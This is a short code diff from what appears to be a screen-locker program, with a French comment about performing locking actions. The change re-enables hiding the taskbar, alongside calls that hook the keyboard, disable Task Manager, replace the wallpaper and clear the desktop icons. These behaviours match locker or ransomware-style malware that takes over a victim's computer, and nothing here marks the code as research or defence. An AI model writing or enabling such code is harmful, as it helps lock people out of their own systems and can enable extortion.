@@ -224,7 +224,7 @@ def main():
     listener = keyboard_hook()
     
     # Effectuer les actions de verrouillage
-   # hide_taskbar()
+    hide_taskbar()
     disable_task_manager()
     set_wallpaper("IMG_7832.jpeg")
     clear_desktop_icons()
